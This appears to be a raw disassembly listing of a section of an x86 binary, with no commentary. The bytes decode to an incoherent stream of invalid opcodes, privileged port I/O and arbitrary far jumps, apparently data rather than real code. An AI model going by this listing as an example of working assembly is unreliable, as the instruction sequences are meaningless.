  411fe9:	shl    bh,0x7d
  411fec:	lds    esp,FWORD PTR [ebx]
  411fee:	fdiv   DWORD PTR [eax-0x5c31065e]
  411ff4:	inc    esi
  411ff5:	gs cs mov ah,0x69
  411ff9:	pop    ecx
  411ffa:	(bad)  
  411ffb:	jle    0x411fd9
  411ffd:	sub    ah,BYTE PTR [edx+ebx*4]
  412000:	mov    DWORD PTR [esi+edx*4+0x73],edx
  412004:	(bad)  
  412005:	jmp    0x411ff7
  412007:	dec    edx
  412008:	cli    
  412009:	mov    al,ds:0x7f46e7e9
  41200e:	jp     0x412049
  412010:	in     al,dx
  412011:	inc    esp
  412012:	sar    DWORD PTR [ebx-0x67],0x22
  412016:	add    eax,0xb722f89c
  41201b:	cmp    eax,eax
  41201d:	push   edi
  41201e:	nop
  41201f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412020:	je     0x4120a1
  412022:	and    BYTE PTR es:[ecx],0x2
  412026:	loop   0x41201e
  412028:	mov    ds:0xce75e545,al
  41202d:	xor    eax,0xf03d5d90
  412032:	or     al,0x50
  412034:	adc    esp,edi
  412036:	jno    0x412030
  412038:	xlat   BYTE PTR ds:[ebx]
  412039:	or     BYTE PTR [ecx+0x28],bh
  41203c:	push   esi
  41203d:	xchg   esi,eax
  41203e:	adc    eax,0x438d34da
  412043:	and    eax,0x64ec3b2f
  412048:	mov    ah,0x9b
  41204a:	fcmove st,st(7)
  41204c:	mov    ah,0xd7
  41204e:	mov    dl,0xee
  412050:	inc    edi
  412051:	jne    0x41201d
  412053:	adc    al,dl
  412055:	rcl    BYTE PTR [ebx+ebp*1-0x54],0x6e
  41205a:	xchg   cl,bh
  41205c:	sbb    ebp,DWORD PTR ds:0x1fccdfe2
  412062:	iret   
  412063:	lods   al,BYTE PTR ds:[esi]
  412064:	jle    0x4120b4
  412066:	scas   eax,DWORD PTR es:[edi]
  412067:	xor    eax,0x88ba58ed
  41206c:	pop    edi
  41206d:	or     BYTE PTR [ebx+eiz*1],cl
  412070:	sbb    DWORD PTR [eax-0x78a50673],0x7cfd795b
  41207a:	dec    esp
  41207b:	adc    ebp,edi
  41207d:	imul   ebp,ebx,0x12806379
  412083:	out    dx,eax
  412084:	jns    0x412024
  412086:	int    0x57
  412088:	test   BYTE PTR [eax+0x5d],bh
  41208b:	rcl    DWORD PTR [ecx-0x6dc8ca26],0x6e
  412092:	fdiv   DWORD PTR [ebp+0x6a]
  412095:	inc    eax
  412096:	out    0xfa,eax
  412098:	rol    DWORD PTR [esi-0x6e9c62b3],cl
  41209e:	jp     0x41209a
  4120a0:	or     esi,DWORD PTR [edx+0x206cfb0]
  4120a6:	adc    DWORD PTR [ecx-0x63],esi
  4120a9:	in     eax,dx
  4120aa:	gs (bad) 
  4120ac:	adc    eax,edi
  4120ae:	(bad)  
  4120af:	or     eax,0xbc37b1c1
  4120b4:	or     bh,cl
  4120b6:	out    dx,eax
  4120b7:	push   0xae935b6f
  4120bc:	add    eax,0x9d9d498f
  4120c1:	out    0xc3,eax
  4120c3:	into   
  4120c4:	stos   BYTE PTR es:[edi],al
  4120c5:	jo     0x41204a
  4120c7:	or     ebp,DWORD PTR [edx-0x34]
  4120ca:	imul   edi,esi,0x4b29eb93
  4120d0:	(bad)  
  4120d1:	rol    ebx,cl
  4120d3:	addr16 sbb bl,dh
  4120d6:	int3   
  4120d7:	inc    eax
  4120d8:	mov    WORD PTR [esi+0xf407499],ss
  4120de:	ds leave 
  4120e0:	(bad)  
  4120e1:	xor    DWORD PTR [eax-0x36],ebx
  4120e4:	js     0x4120b4
  4120e6:	or     BYTE PTR [ebx],0x6d
  4120e9:	sbb    edx,ecx
  4120eb:	mov    WORD PTR [ebx+0x28],?
  4120ee:	mov    cl,0x14
  4120f0:	cmp    ch,ch
  4120f2:	push   eax
  4120f3:	ret    
  4120f4:	or     BYTE PTR [ecx+0x2],ch
  4120f7:	cmp    ebx,DWORD PTR [edi+0xd]
  4120fa:	and    BYTE PTR [ebx+0x61b885b5],bl
  412100:	adc    esp,edi
  412102:	pop    esp
  412103:	into   
  412104:	inc    eax
  412105:	or     eax,0x3964656
  41210a:	push   eax
  41210b:	inc    ebp
  41210c:	pusha  
  41210d:	mov    ds:0x2f1c8448,al
  412112:	jl     0x41214f
  412114:	push   ss
  412115:	fdivr  DWORD PTR [edi-0x3190bffe]
  41211b:	xchg   edx,eax
  41211c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41211d:	pushf  
  41211e:	sub    bl,BYTE PTR [ebp+0x1725890]
  412124:	out    0x10,eax
  412126:	arpl   WORD PTR [edi],sp
  412128:	inc    edx
  412129:	jno    0x412148
  41212b:	(bad)  
  41212c:	mov    cl,0x74
  41212e:	je     0x4120b6
  412130:	sbb    DWORD PTR [esi-0x69],ebx
  412133:	mov    ch,0x88
  412135:	pushf  
  412136:	xchg   ecx,eax
  412137:	inc    ecx
  412138:	pop    es
  412139:	out    dx,al
  41213a:	mov    ds:0x68e6db57,al
  41213f:	loope  0x41215f
  412141:	and    ebp,DWORD PTR [ecx]
  412143:	or     eax,0xcfe54e2f
  412148:	push   cs
  412149:	and    cl,al
  41214b:	loop   0x41211f
  41214d:	je     0x41215b
  41214f:	in     al,dx
  412150:	(bad)  
  412152:	test   BYTE PTR ds:0x3ff8e4c1,ch
  412158:	int    0xbe
  41215a:	ficom  WORD PTR [edi+0x66]
  41215d:	dec    ebx
  41215e:	and    eax,0xaba2c4d1
  412163:	inc    edx
  412164:	cdq    
  412165:	fsubr  st(1),st
  412167:	and    ah,al
  412169:	adc    ecx,DWORD PTR [ebp-0x5dc30820]
  41216f:	stos   BYTE PTR es:[edi],al
  412170:	push   ebp
  412171:	cmp    dh,BYTE PTR [ecx-0xa]
  412174:	mov    gs,WORD PTR [eax-0x44]
  412177:	popf   
  412178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412179:	fadd   QWORD PTR [esi-0x578b6ad4]
  41217f:	scas   al,BYTE PTR es:[edi]
  412180:	cdq    
  412181:	stc    
  412182:	rcl    ah,1
  412184:	aad    0x90
  412186:	push   0x2d15e6a3
  41218b:	icebp  
  41218c:	lahf   
  41218d:	dec    edi
  41218e:	ja     0x41217a
  412190:	cmove  ecx,esp
  412193:	mov    esi,0x5b3fd8a5
  412198:	int    0xc2
  41219a:	std    
  41219b:	jb     0x4121a6
  41219d:	dec    esi
  41219e:	mov    esi,0x22129d77
  4121a3:	pop    ss
  4121a4:	push   0x242d7dfa
  4121a9:	and    dh,cl
  4121ab:	jo     0x41217d
  4121ad:	pop    ss
  4121ae:	(bad)  
  4121af:	loope  0x4121fc
  4121b1:	scas   al,BYTE PTR es:[edi]
  4121b2:	xor    dh,BYTE PTR [edi-0x46]
  4121b5:	sbb    ebx,esp
  4121b7:	test   eax,0x2b008ca
  4121bc:	retf   
  4121bd:	mov    ebp,0x6dd83fcc
  4121c2:	or     BYTE PTR [ebx],cl
  4121c4:	and    dh,ah
  4121c6:	cli    
  4121c7:	outs   dx,DWORD PTR ds:[esi]
  4121c8:	int    0xb2
  4121ca:	jg     0x4121ab
  4121cc:	jns    0x4121e1
  4121ce:	(bad)  
  4121cf:	in     al,0x1c
  4121d1:	adc    esi,DWORD PTR [ebp+ecx*4+0x4d]
  4121d5:	mov    ecx,0x95ef4541
  4121da:	cmp    DWORD PTR [edx-0x6b],ecx
  4121dd:	sbb    eax,0x880dd3f9
  4121e2:	sti    
  4121e3:	(bad)  [ebx+ebp*1+0x65]
  4121e7:	mov    eax,ds:0xb8ccedf7
  4121ec:	or     BYTE PTR [eax+ebx*1],dl
  4121ef:	rcr    DWORD PTR [ecx+eiz*8],1
  4121f2:	inc    esp
  4121f3:	test   al,0xe7
  4121f5:	or     al,0x9c
  4121f7:	cmp    al,BYTE PTR [eax+0xe7cfd37]
  4121fd:	pop    ebp
  4121fe:	sbb    dl,BYTE PTR [edx+0x7f52f430]
  412204:	fistp  DWORD PTR [ebp+0x2b477006]
  41220a:	jg     0x41221d
  41220c:	loope  0x41225b
  41220e:	fidivr WORD PTR [esp-0x1c]
  412212:	ror    DWORD PTR [ebx],1
  412214:	inc    edx
  412215:	ins    DWORD PTR es:[edi],dx
  412216:	sub    ch,dl
  412218:	in     al,dx
  412219:	push   ds
  41221a:	addr16 iret 
  41221c:	test   al,0xf7
  41221e:	scas   al,BYTE PTR es:[edi]
  41221f:	cmp    al,0xb0
  412221:	mov    edx,DWORD PTR [ebx]
  412223:	outs   dx,BYTE PTR ds:[esi]
  412224:	gs inc ebx
  412226:	mov    dh,0xbf
  412228:	outs   dx,DWORD PTR ds:[esi]
  412229:	xchg   ebp,eax
  41222a:	xchg   BYTE PTR [eax+ecx*1+0x6aef71ff],dh
  412231:	shr    BYTE PTR [edx-0x2e],0xf3
  412235:	mov    DWORD PTR [ecx],esp
  412237:	aam    0x15
  412239:	sbb    esp,0xb2d917f7
  41223f:	(bad)  [edi-0x18]
  412242:	test   BYTE PTR [edx-0x1355f7c4],cl
  412248:	ror    BYTE PTR [esi+0x18eb7a40],1
  41224e:	iret   
  41224f:	and    eax,0xf10a293c
  412254:	mov    cl,0x6f
  412256:	cwde   
  412257:	jo     0x4121fc
  412259:	repnz das 
  41225b:	mov    edi,esi
  41225d:	out    0xac,eax
  41225f:	mov    dh,0xed
  412261:	fld    QWORD PTR [eax+ebp*4+0x6212fe07]
  412268:	call   0x3379:0x48722b68
  41226f:	push   edx
  412270:	cli    
  412271:	inc    edi
  412272:	nop
  412273:	push   eax
  412274:	pop    es
  412275:	sahf   
  412276:	lock jp 0x412202
  412279:	scas   al,BYTE PTR es:[edi]
  41227a:	aaa    
  41227b:	pop    ds
  41227c:	loop   0x4122f6
  41227e:	inc    edi
  41227f:	nop
  412280:	adc    BYTE PTR [ebp+ecx*8-0x3b48e22b],cl
  412287:	or     eax,0x5b646dca
  41228c:	xor    DWORD PTR [ecx],edi
  41228e:	mov    bh,0x1
  412290:	push   cs
  412291:	push   esp
  412292:	je     0x41228f
  412294:	test   eax,0x9dbbba03
  412299:	fdiv   QWORD PTR [esi-0x31]
  41229c:	inc    eax
  41229d:	sub    DWORD PTR [esi+edi*4-0x65],esi
  4122a1:	cmp    BYTE PTR [esp+edx*4+0x71be8b34],bl
  4122a8:	mov    cl,0xf7
  4122aa:	stc    
  4122ab:	and    eax,0xdb870ec7
  4122b0:	inc    DWORD PTR [eax+eiz*8-0x253178f9]
  4122b7:	rcr    DWORD PTR ds:0xc1588f04,0xd
  4122be:	add    ch,BYTE PTR [edi-0xb]
  4122c1:	mov    ecx,0xebc1efa1
  4122c6:	enter  0x708b,0xe4
  4122ca:	call   0x10da:0xa993c5cd
  4122d1:	ror    BYTE PTR [eax],1
  4122d3:	cmp    edx,DWORD PTR [ebx+0x21621b77]
  4122d9:	retf   
  4122da:	dec    ebx
  4122db:	int    0x15
  4122dd:	adc    BYTE PTR [esi+ecx*2+0x8],ah
  4122e1:	aas    
  4122e2:	sti    
  4122e3:	and    bh,BYTE PTR [edx]
  4122e5:	pop    ds
  4122e6:	jle    0x412291
  4122e8:	in     al,dx
  4122e9:	mov    ah,0x67
  4122eb:	add    esi,DWORD PTR [eax+0x65cd7468]
  4122f1:	xchg   edx,eax
  4122f2:	inc    esi
  4122f3:	pop    ss
  4122f4:	ret    
  4122f5:	and    DWORD PTR [edi],0xda7d58c5
  4122fb:	not    DWORD PTR [edi+0x7]
  4122fe:	xchg   edi,eax
  4122ff:	ss sub DWORD PTR ds:[edx+0x345fddb3],esp
  412307:	stos   DWORD PTR es:[edi],eax
  412308:	pop    ecx
  412309:	xchg   ebx,eax
  41230a:	fidivr WORD PTR [edx+0x6f]
  41230d:	popa   
  41230e:	pop    ss
  41230f:	mov    bh,0xad
  412311:	shr    BYTE PTR [eax],1
  412313:	mov    cl,0xfd
  412315:	(bad)  
  412316:	enter  0xb62f,0x13
  41231a:	ds (bad) 
  41231c:	mov    esi,DWORD PTR [eax+ecx*4-0x41dd65bc]
  412323:	aaa    
  412324:	dec    esi
  412325:	ficomp WORD PTR [eax+0x56aff322]
  41232b:	shr    ah,0x9c
  41232e:	add    eax,0xd94d70a2
  412333:	loope  0x4122bf
  412335:	jmp    0x36197f1a
  41233a:	mov    esp,ebx
  41233c:	addr16 call 0x15656be
  412342:	imul   edx,ecx,0x3d
  412345:	xor    eax,0x94467414
  41234a:	lds    ecx,FWORD PTR [eax]
  41234c:	je     0x41231e
  41234e:	aaa    
  41234f:	mov    ebx,0x86a4ed3b
  412354:	jae    0x4122ea
  412356:	and    BYTE PTR [edi],0xad
  412359:	xchg   ebx,eax
  41235a:	mov    dh,0xca
  41235c:	loopne 0x412320
  41235e:	mov    edi,DWORD PTR [edx-0x22798122]
  412364:	iret   
  412365:	imul   edx,DWORD PTR [bx+di+0x3667],0x4e5126ee
  41236e:	xchg   ebx,eax
  41236f:	mov    ch,0x21
  412371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412372:	mov    ebx,DWORD PTR [eax+0x93901e7]
  412378:	xchg   esi,eax
  412379:	sub    al,BYTE PTR [edx+0x47]
  41237c:	loop   0x412368
  41237e:	add    edi,DWORD PTR [ebx-0x4a895e10]
  412384:	icebp  
  412385:	dec    edi
  412386:	jnp    0x412319
  412388:	sbb    esi,DWORD PTR [ebx*2-0x153613e8]
  41238f:	cdq    
  412390:	inc    esi
  412391:	test   dl,ah
  412393:	push   esp
  412394:	sbb    ebx,ebp
  412396:	in     al,0x8b
  412398:	jno    0x4123c7
  41239a:	adc    DWORD PTR [eax+0x3a5f038b],edx
  4123a0:	xor    cl,BYTE PTR [ebp-0x67]
  4123a3:	idiv   BYTE PTR [eax]
  4123a5:	(bad)  
  4123a6:	sub    esi,DWORD PTR [edx]
  4123a8:	jg     0x412402
  4123aa:	jnp    0x4123b9
  4123ac:	loopne 0x41234c
  4123ae:	xchg   ebp,eax
  4123af:	mov    bl,0x2
  4123b1:	int3   
  4123b2:	cdq    
  4123b3:	jo     0x4123e5
  4123b5:	loope  0x4123e2
  4123b7:	clc    
  4123b8:	push   esp
  4123b9:	mov    eax,ds:0xf7e04d03
  4123be:	test   cl,dl
  4123c0:	lahf   
  4123c1:	(bad)  [edx+0x45b3cb48]
  4123c7:	sbb    DWORD PTR [ebp-0x50bb6acd],eax
  4123cd:	add    ebp,DWORD PTR [edi-0x49]
  4123d0:	lea    esi,[ebp-0xef8227]
  4123d6:	push   ebp
  4123d7:	outs   dx,BYTE PTR ds:[esi]
  4123d8:	sub    al,0x37
  4123da:	mov    ebx,0x4b7d7bb3
  4123df:	bound  ebx,QWORD PTR [edx-0x3a]
  4123e2:	test   eax,0xc74393f3
  4123e7:	push   cs
  4123e8:	daa    
  4123e9:	lods   eax,DWORD PTR ds:[esi]
  4123ea:	mov    eax,ds:0x37bb0b77
  4123ef:	xor    eax,0xebea185b
  4123f4:	sbb    BYTE PTR [edx+0xd],0x53
  4123f8:	mov    esi,0xfde79df2
  4123fd:	lods   al,BYTE PTR ds:[esi]
  4123fe:	stos   DWORD PTR es:[edi],eax
  4123ff:	mov    eax,ds:0xa7e1f5c2
  412404:	shl    DWORD PTR [edx-0x45],1
  412407:	pop    ss
  412408:	xor    ecx,DWORD PTR [edi+0x4c]
  41240b:	mov    ah,0xc
  41240d:	jmp    0x4123d7
  41240f:	adc    BYTE PTR [eax],bh
  412411:	mov    esi,0x16167978
  412416:	mov    dl,0x5
  412418:	arpl   WORD PTR [eax+0x6d],cx
  41241b:	bound  eax,QWORD PTR [eax+esi*2]
  41241e:	call   0xda8f:0x97d6f5e4
  412425:	pop    es
  412426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412427:	adc    eax,0xe2905ca4
  41242c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41242d:	jnp    0x41244f
  41242f:	sub    cl,bh
  412431:	sbb    eax,0xee396b55
  412436:	daa    
  412437:	dec    esi
  412438:	scas   eax,DWORD PTR es:[edi]
  412439:	xchg   esi,eax
  41243a:	clc    
  41243b:	jnp    0x412418
  41243d:	adc    ch,0xa0
  412440:	push   esi
  412441:	rcl    BYTE PTR [eax],cl
  412443:	out    dx,eax
  412444:	retf   
  412445:	sbb    DWORD PTR [edi],edx
  412447:	cmp    eax,0x7966063f
  41244c:	jmp    0x5e76e1b
  412451:	int    0x8c
  412453:	in     eax,0xd8
  412455:	sbb    bl,BYTE PTR [ebp+0x1cd157d3]
  41245b:	push   ebp
  41245c:	rcl    BYTE PTR [ebx+eiz*8-0x70],cl
  412460:	dec    esp
  412461:	mov    ebp,0x179c48f1
  412466:	mov    gs,WORD PTR [eax]
  412468:	into   
  412469:	sub    dh,BYTE PTR [edx-0x206d68f6]
  41246f:	mov    al,0x11
  412471:	xor    al,0x8a
  412473:	ins    DWORD PTR es:[edi],dx
  412474:	test   eax,0xbd6380a4
  412479:	stc    
  41247a:	or     eax,0x3cfb5d34
  41247f:	scas   eax,DWORD PTR es:[edi]
  412480:	sbb    al,0x78
  412482:	pop    ecx
  412483:	pushf  
  412484:	and    bl,dl
  412486:	imul   edx,esp,0xa290a642
  41248c:	and    eax,0xc9b6d5c3
  412491:	sbb    al,0xc1
  412493:	jo     0x4124ab
  412495:	xor    al,BYTE PTR [esi-0x617dbec4]
  41249b:	mov    ecx,0xfb82e80a
  4124a0:	mov    eax,ds:0xfb44d2c9
  4124a5:	out    0xf1,eax
  4124a7:	or     ebp,DWORD PTR [ecx]
  4124a9:	push   esi
  4124aa:	push   ecx
  4124ab:	(bad)  [ebp+0x7d]
  4124ae:	inc    edx
  4124af:	loopne 0x41250f
  4124b1:	mov    esi,0x648f854d
  4124b6:	jmp    0x16834927
  4124bb:	mov    bl,0x16
  4124bd:	dec    edx
  4124be:	pop    ss
  4124bf:	xor    eax,0xea9b3545
  4124c4:	mov    ah,0x57
  4124c6:	xchg   edi,eax
  4124c7:	dec    eax
  4124c8:	pop    edi
  4124c9:	ficom  WORD PTR [edx]
  4124cb:	pop    esp
  4124cc:	lahf   
  4124cd:	dec    eax
  4124ce:	rol    edx,0xd1
  4124d1:	dec    ebp
  4124d2:	adc    al,0x20
  4124d4:	leave  
  4124d5:	xor    DWORD PTR [ebp+ebx*4-0x40d58b10],ebp
  4124dc:	inc    ebx
  4124dd:	and    BYTE PTR [edx-0x4808655f],ah
  4124e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124e4:	jmp    0x77e8:0x7a8a15f0
  4124eb:	mov    BYTE PTR [edi+0x4e5e238b],al
  4124f1:	cmp    ebx,DWORD PTR ds:0xb2d0f53c
  4124f7:	(bad)  
  4124f9:	add    al,0xab
  4124fb:	adc    eax,0xec13d10f
  412500:	sahf   
  412501:	outs   dx,DWORD PTR ds:[esi]
  412502:	retf   
  412503:	xor    DWORD PTR [edx],edi
  412505:	(bad)  
  412506:	cwde   
  412507:	cdq    
  412508:	in     eax,dx
  412509:	out    0xc2,al
  41250b:	test   DWORD PTR [ebp+0x43638b4f],eax
  412511:	sbb    BYTE PTR [ebp+0x45e46db0],al
  412517:	push   ds
  412518:	int    0x74
  41251a:	shl    DWORD PTR [ebx],cl
  41251c:	add    eax,0x87dd1cc5
  412521:	sub    BYTE PTR [eax+0x3025676],0x11
  412528:	jae    0x412566
  41252a:	repnz retf 0xa90f
  41252e:	pushf  
  41252f:	clc    
  412530:	ret    0xf172
  412533:	call   0x876:0xba103f6f
  41253a:	mov    bh,0xc2
  41253c:	jg     0x4124ea
  41253e:	shl    BYTE PTR [eax],0x6d
  412541:	xchg   BYTE PTR [eax-0x22],ch
  412544:	(bad)  
  412546:	jbe    0x412559
  412548:	fnsave [eax]
  41254a:	xor    eax,eax
  41254c:	test   eax,0xf40086ca
  412551:	popf   
  412552:	stos   DWORD PTR es:[edi],eax
  412553:	jecxz  0x412515
  412555:	repz dec esi
  412557:	sub    BYTE PTR [ecx-0x24],bh
  41255a:	in     al,dx
  41255b:	xlat   BYTE PTR ds:[ebx]
  41255c:	je     0x412564
  41255e:	jno    0x412531
  412560:	xchg   edi,eax
  412561:	mov    dh,0xd0
  412563:	pop    esi
  412564:	das    
  412565:	inc    esi
  412566:	ins    BYTE PTR es:[edi],dx
  412567:	xchg   edi,eax
  412568:	ret    0xa04a
  41256b:	sbb    ebx,edi
  41256d:	das    
  41256e:	mov    cl,0xa0
  412570:	mov    bh,0x8f
  412572:	rcr    DWORD PTR [ecx+0x76],0x64
  412576:	daa    
  412577:	call   0x37f9:0x4377c0e1
  41257e:	imul   ebx,DWORD PTR [ebp+edx*8+0x76],0xa42a86b7
  412586:	mov    dh,0xa1
  412588:	xor    esp,DWORD PTR [edi]
  41258a:	stos   BYTE PTR es:[edi],al
  41258b:	push   0xeb653cb9
  412590:	(bad)  
  412591:	xor    bl,cl
  412593:	in     al,dx
  412594:	xchg   ebx,eax
  412595:	clc    
  412596:	repz mov ch,0x0
  412599:	adc    DWORD PTR [edx+0x41f6749f],ebx
  41259f:	sbb    DWORD PTR [esi],edx
  4125a1:	xchg   ebx,eax
  4125a2:	sbb    BYTE PTR [eax+0x4b],ah
  4125a5:	fwait
  4125a6:	dec    ebp
  4125a7:	and    al,0x6
  4125a9:	sub    ecx,edi
  4125ab:	cs adc eax,0xa789b180
  4125b1:	(bad)  
  4125b3:	test   BYTE PTR [esi],dl
  4125b5:	in     eax,0xbf
  4125b7:	icebp  
  4125b8:	stc    
  4125b9:	jge    0x412544
  4125bb:	sbb    BYTE PTR [esi-0x44],bl
  4125be:	add    ch,ch
  4125c0:	int    0xb
  4125c2:	or     eax,0x774902e
  4125c7:	lock jb 0x4125ea
  4125ca:	push   eax
  4125cb:	and    al,0x1a
  4125cd:	cmp    dh,BYTE PTR [ebp+0x27]
  4125d0:	nop
  4125d1:	mov    ds:0xf0182271,al
  4125d6:	fimul  WORD PTR [edx-0x64]
  4125d9:	js     0x4125a8
  4125db:	inc    ebp
  4125dc:	xchg   esp,eax
  4125dd:	cmp    esi,DWORD PTR [esi+0x1a]
  4125e0:	xor    eax,0x5bfada54
  4125e5:	dec    ebp
  4125e6:	(bad)  
  4125e7:	pop    esp
  4125e8:	sar    DWORD PTR [ecx-0x73],1
  4125eb:	and    dl,ch
  4125ed:	add    eax,0xee795524
  4125f2:	jecxz  0x412578
  4125f4:	pop    es
  4125f5:	mov    gs,WORD PTR [ebx+esi*4-0x76]
  4125f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125fa:	jno    0x4125c3
  4125fc:	nop
  4125fd:	in     eax,dx
  4125fe:	adc    eax,0x9409ec11
  412603:	push   cs
  412604:	cmc    
  412605:	mov    ah,0x14
  412607:	sub    eax,0x9ba0f607
  41260c:	mov    DWORD PTR [ebx+0x1f],ebx
  41260f:	push   0x5a
  412611:	cmp    edx,ecx
  412613:	xchg   DWORD PTR [ebx-0x79a9f19b],ebp
  412619:	enter  0xecf7,0x49
  41261d:	fwait
  41261e:	imul   ecx,DWORD PTR [eax-0x730c9751],0xffffffeb
  412625:	inc    esp
  412626:	dec    ecx
  412627:	sub    al,BYTE PTR [eax+0x1e280920]
  41262d:	lea    esi,[ebx+0xe]
  412630:	into   
  412631:	lock xchg ebx,eax
  412633:	or     BYTE PTR [esi+0x55269de7],0x25
  41263a:	arpl   WORD PTR [eax+0x62745660],bp
  412640:	mov    edi,0x45413fd4
  412645:	jmp    0x3711:0x50aa5194
  41264c:	push   cs
  41264d:	not    BYTE PTR [ebx-0x7c]
  412650:	jo     0x4125f4
  412652:	xchg   ebx,eax
  412653:	not    DWORD PTR [ecx+ebx*2+0x673250f6]
  41265a:	dec    esi
  41265b:	inc    edi
  41265c:	test   DWORD PTR [edi],edi
  41265e:	sub    eax,edx
  412660:	(bad)  
  412661:	(bad)  
  412662:	jl     0x4125f3
  412664:	push   eax
  412665:	push   cs
  412666:	popa   
  412667:	adc    al,0xad
  412669:	(bad)  
  41266a:	xor    bl,BYTE PTR ss:[ebp-0x71ff7161]
  412671:	sub    al,0x66
  412673:	cdq    
  412674:	mov    ebx,0x80fa6d6f
  412679:	inc    esi
  41267a:	pop    ds
  41267b:	and    eax,0xb7d05b7
  412680:	ror    BYTE PTR [ebx],0x43
  412683:	test   al,0xf
  412685:	sbb    ah,BYTE PTR [esi-0x66]
  412688:	sub    al,0x7d
  41268a:	popa   
  41268b:	ficomp WORD PTR [ecx-0x74]
  41268e:	inc    edx
  41268f:	cmp    al,0x15
  412691:	mov    bh,0xfe
  412693:	sbb    dl,BYTE PTR [ecx+0x20]
  412696:	out    0x1e,eax
  412698:	ja     0x4126cd
  41269a:	shl    al,0x35
  41269d:	xor    DWORD PTR [ebx],ebp
  41269f:	icebp  
  4126a0:	in     al,dx
  4126a1:	ret    
  4126a2:	in     eax,0xe5
  4126a4:	lods   eax,DWORD PTR ds:[esi]
  4126a5:	cld    
  4126a6:	or     dh,bl
  4126a8:	jmp    0x572915dc
  4126ad:	mov    esp,0xa1ec48b2
  4126b2:	jmp    0x412640
  4126b4:	sti    
  4126b5:	pop    eax
  4126b6:	pop    ds
  4126b7:	loop   0x412694
  4126b9:	outs   dx,DWORD PTR ds:[esi]
  4126ba:	xchg   ebx,eax
  4126bb:	scas   al,BYTE PTR es:[di]
  4126bd:	push   0xe7888fde
  4126c2:	pop    esi
  4126c3:	inc    eax
  4126c4:	in     eax,dx
  4126c5:	dec    esp
  4126c6:	aas    
  4126c7:	popa   
  4126c8:	adc    edi,DWORD PTR ds:0x6a722701
  4126ce:	je     0x41268f
  4126d0:	jno    0x41273f
  4126d2:	les    edx,FWORD PTR [ecx-0x3feaa42e]
  4126d8:	out    0x48,eax
  4126da:	loope  0x4126dc
  4126dc:	retf   
  4126dd:	add    ch,BYTE PTR [edx]
  4126df:	mov    ebx,0xbc83fe0c
  4126e4:	jp     0x4126b8
  4126e6:	arpl   WORD PTR [ebx+0x3a],bx
  4126e9:	ins    BYTE PTR es:[edi],dx
  4126ea:	rcr    DWORD PTR [edx+ebx*1+0x46361e2f],0xe9
  4126f2:	dec    ebx
  4126f3:	das    
  4126f4:	call   0xd09a:0x7bdbfbf1
  4126fb:	jnp    0x4126ab
  4126fd:	mov    bl,0xf3
  4126ff:	adc    al,0xbe
  412701:	test   DWORD PTR [ecx+0x4e],eax
  412704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412705:	adc    cl,BYTE PTR [ebx-0x5e]
  412708:	dec    esi
  412709:	pusha  
  41270a:	fnsave [esi]
  41270c:	mov    ds:0xd7c09b13,eax
  412711:	cmp    eax,0xc5923794
  412716:	(bad)  
  412717:	mov    eax,0xe3789791
  41271c:	out    0x40,al
  41271e:	nop
  41271f:	jge    0x4126c6
  412721:	clc    
  412722:	or     eax,esp
  412724:	loopne 0x4126d2
  412726:	adc    al,0x89
  412728:	push   es
  412729:	sub    eax,0xd6ba5c37
  41272e:	sbb    DWORD PTR [esi],esi
  412730:	scas   al,BYTE PTR es:[edi]
  412731:	mov    ch,0x1c
  412733:	sub    eax,0xacd01028
  412738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412739:	jge    0x412778
  41273b:	mov    cr5,esp
  41273e:	sbb    DWORD PTR [edi],eax
  412740:	cvtps2pi mm4,QWORD PTR [eax]
  412743:	mov    eax,ds:0xaee461ac
  412748:	(bad)  
  412749:	js     0x4126de
  41274b:	mov    bh,0x87
  41274d:	jg     0x412796
  41274f:	mov    al,ds:0xe98059f7
  412754:	iret   
  412755:	adc    edi,DWORD PTR [ebp+0x58a2d64e]
  41275b:	jp     0x412746
  41275d:	mov    bh,dh
  41275f:	and    bl,BYTE PTR [edx+esi*8+0x6b322109]
  412766:	out    0x3d,al
  412768:	stc    
  412769:	sti    
  41276a:	or     eax,esp
  41276c:	pop    edi
  41276d:	jns    0x4127cc
  41276f:	ja     0x412752
  412771:	jge    0x41278f
  412773:	mov    bh,0x27
  412775:	mov    al,0x78
  412777:	(bad)  
  412778:	jl     0x412760
  41277a:	jl     0x4127cf
  41277c:	push   ebx
  41277d:	fld    DWORD PTR [esi+0x72e5d149]
  412783:	xor    eax,0x98a45a3f
  412788:	fsubp  st(0),st
  41278a:	ja     0x412744
  41278c:	sahf   
  41278d:	leave  
  41278e:	sbb    bl,BYTE PTR [esi+0xd]
  412791:	loope  0x4127e0
  412793:	std    
  412794:	out    dx,eax
  412795:	or     edi,eax
  412797:	ror    DWORD PTR [edi+0xd8a53b0],cl
  41279d:	mov    esi,ebx
  41279f:	and    ch,BYTE PTR [ebp+0x2e]
  4127a2:	mov    bl,0x30
  4127a4:	sbb    al,0x5f
  4127a6:	out    0xae,al
  4127a8:	inc    edi
  4127a9:	out    dx,al
  4127aa:	adc    al,0x14
  4127ac:	test   BYTE PTR [ebx+0x37956493],ch
  4127b2:	cmc    
  4127b3:	and    al,BYTE PTR [ecx-0x3893423c]
  4127b9:	xchg   ecx,eax
  4127ba:	or     DWORD PTR [ecx],ebp
  4127bc:	rcr    BYTE PTR [edi],cl
  4127be:	gs mov bh,0x12
  4127c1:	ja     0x412823
  4127c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127c4:	rcl    BYTE PTR [esi-0x67],0x44
  4127c8:	mov    ebx,0x2e5efa22
  4127cd:	loopne 0x412828
  4127cf:	retf   0x1cc9
  4127d2:	mov    ebx,0x2ffe511c
  4127d7:	mov    ah,0x2a
  4127d9:	int3   
  4127da:	adc    edx,edi
  4127dc:	pop    ebp
  4127dd:	sub    BYTE PTR [edx],ch
  4127df:	push   0x8c255c4a
  4127e4:	push   0x91dc10a3
  4127e9:	clc    
  4127ea:	(bad)  
  4127eb:	sahf   
  4127ec:	dec    eax
  4127ed:	sub    ebp,DWORD PTR es:[eax]
